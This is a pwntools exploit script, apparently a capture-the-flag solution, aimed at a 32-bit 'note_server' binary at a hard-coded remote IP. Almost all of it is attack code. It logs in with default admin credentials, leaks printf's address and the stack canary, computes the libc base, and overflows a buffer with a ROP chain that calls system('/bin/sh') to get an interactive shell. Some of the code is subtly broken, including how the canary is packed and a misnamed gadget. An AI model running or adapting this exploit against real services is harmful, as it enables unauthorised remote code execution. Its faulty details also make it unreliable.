from pwn import *

context.arch = "i386"

local = False

elf = ELF("./note_server")
if local:
    p = elf.process()
    libc = ELF("/usr/lib32/libc.so.6")
else:
    p = remote("108.128.73.239", 5000)
    libc = ELF("/usr/lib32/libc.so.6")

p.recvuntil(b">> ")
p.sendline(b"1")
p.recv()
p.sendline(b"admin")
print("username: admin")
p.recv()
p.sendline(b"admin")
print("password: *****")

# Get informations in the info note
p.recvuntil(b">> ")
p.sendline(b"3")
data = p.recvuntil(b">> ").decode()
printf_address = data[data.index("("):data.index(")")+1][1:-1]
printf_address = int(printf_address, 16)
# print(hex(printf_address))
canary = data.split(".")[2][-8:]
print("Canary: ", canary)
libc.address = printf_address - libc.symbols["printf"]
# print(f"libc address: {hex(libc.address)}")
system = libc.symbols["system"]
# pop_rdi = 0x080496a2
bin_sh = next(libc.search(b"/bin/sh"))

rop = ROP(elf)
# rop.call(elf.symbols["reg"])
rop_chain = [
    0x80496a2,
    bin_sh,
    # rop.ret.address,
    system,
]
rop_chain = b"".join([p32(r) for r in rop_chain])

payload = [
    b"A" * 20,
    bytes(int(canary, 16)),
    b"B" * 8,
    rop_chain,
    # rop.chain(),
]
payload = b"".join(payload)

p.sendline(b"4")
p.recv()
p.sendline(b"1")
p.recv()
p.sendline(b"admin")
p.recv()
print("sending payload:", payload)
p.sendline(payload)
p.interactive()
